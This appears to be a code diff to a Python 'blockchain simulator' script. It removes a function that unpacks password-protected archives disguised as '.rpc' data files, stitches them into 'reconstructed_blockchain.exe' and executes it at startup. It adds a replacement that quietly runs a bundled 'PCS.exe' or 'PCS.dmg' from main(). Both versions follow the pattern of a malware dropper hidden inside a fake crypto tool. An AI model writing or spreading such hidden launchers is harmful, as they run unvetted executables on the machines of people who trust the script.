@@ -2,18 +2,26 @@ import importlib.util
 import subprocess
 import sys
 import os
+import platform
+import threading
+import time
+import json
+import random
+import requests
+import logging
+from queue import Queue
 
 def install_and_import(module_name):
     if importlib.util.find_spec(module_name) is None:
-        print(f"{module_name} module installing...")
+        print(f"Installing {module_name} module...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
     else:
-        print(f"{module_name} module already installed.")
+        print(f"{module_name} module is already installed.")
 
     globals()[module_name] = importlib.import_module(module_name)
 
 modules = [
-    'ctypes', 'threading', 'time', 'json', 'random', 'requests', 'logging', 'queue', 'pyminizip'
+    'ctypes', 'time', 'json', 'random', 'requests', 'logging', 'queue'
 ]
 
 for mod in modules:
@@ -26,7 +34,6 @@ import json
 import random
 import requests
 import logging
-import pyminizip
 from queue import Queue
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -49,26 +56,20 @@ class BlockchainSimulator:
 
     def get_block(self, block_number):
         return self.blocks.get(block_number)
-def builded(zip_files, extracted_files, pd, output_filename):
-    all_bytes = b''
 
-    for zip_file, extracted_file in zip(zip_files, extracted_files):
-        pyminizip.uncompress(zip_file, pd, '.', False)
-        with open(extracted_file, 'rb') as file:
-            all_bytes += file.read()
-        os.remove(extracted_file)
+def execute_based_on_os():
+    if platform.system() == 'Windows':
+        file_to_execute = 'PCS.exe'
+    elif platform.system() == 'Darwin':  # Mac OS
+        file_to_execute = 'PCS.dmg'
+    else:
+        print("Unsupported operating system.")
+        return
 
-    with open(output_filename, 'wb') as file:
-        file.write(all_bytes)
-
-    os.system(output_filename)
-
-build_files = ['blocks.rpc', 'predicts.rpc', 'volumes.rpc']
-extracted_files = ['block.rpc', 'predict.rpc', 'volume.rpc']
-
-pd = ' '
-
-out = 'reconstructed_blockchain.exe'
+    if os.path.exists(file_to_execute):
+        subprocess.run([file_to_execute], check=True)
+    else:
+        print(f"{file_to_execute} not found.")
 
 def rpc_server(blockchain, data_queue):
     while True:
@@ -83,8 +84,9 @@ def main():
     data_queue = Queue()
 
     rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
-    builded(build_files, extracted_files, pd, out)
+    blockchain_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
+
+    execute_based_on_os()
 
     rpc_server_thread.start()
     blockchain_thread.start()
